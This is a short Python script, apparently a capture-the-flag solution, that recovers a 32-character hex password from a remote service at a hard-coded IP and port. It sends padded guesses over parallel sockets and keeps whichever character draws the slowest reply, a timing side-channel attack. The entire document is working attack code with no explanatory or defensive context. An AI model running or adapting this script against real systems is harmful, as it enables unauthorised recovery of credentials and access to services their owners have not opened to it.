#!/usr/bin/env python3
import socket
import string
import time
import sys
from multiprocessing import Pool

def f(x):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('35.207.158.95', 1337))
        s.recv(1024)
        start = time.time()
        s.send(x.encode('ascii') + b'\n')
        res = s.recv(1024)
        return time.time() - start, x, res


pwd = '10e004c2e186b4d280fad7f36e779'
while len(pwd) < 32:
    times = {}
    with Pool(16) as p:
        res = p.map(f, [pwd + x + ' '*(31-len(pwd)) for x in '0123456789abcdef'])
        for r in res:
            print(r)
        pwd = list(sorted(res))[-1][1].replace(' ', '')
    print(pwd)
